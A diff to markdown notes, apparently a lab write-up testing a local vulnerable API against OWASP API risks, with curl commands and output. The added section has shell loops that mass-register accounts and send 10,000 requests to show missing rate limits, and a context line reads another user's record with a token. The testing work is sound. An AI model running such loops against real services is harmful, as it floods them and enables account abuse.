@@ -48,3 +48,22 @@ curl -X POST http://localhost:8080/users/v1/login \
 curl -X GET http://localhost:8080/users/v1/testuser2 \
      -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NDI3MzgzNTAsImlhdCI6MTc0MjczODI5MCwic3ViIjoidGVzdHVzZXIzIn0.RU0xmFFpjDz5TJAlYoINURvERBgyihJhjPs-8rl8tVE"
 {"username": "testuser2", "email": "testuser2@example.com"}%
+```
+
+## API4:2023 Unrestricted Resource Consumption
+```
+or i in {20..30}; do
+  curl -X POST http://localhost:8080/users/v1/register \
+     -H "Content-Type: application/json" \
+     -d "{\"username\": \"testuser$i\", \"password\": \"password123\", \"email\": \"testuser$i@example.com\"}"
+done
+
+{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}%
+```
+
+или еще один c неограниченным количеством запросов:
+```
+for i in {1..10000}; do
+  curl http://localhost:8080/users/v1
+done
+```
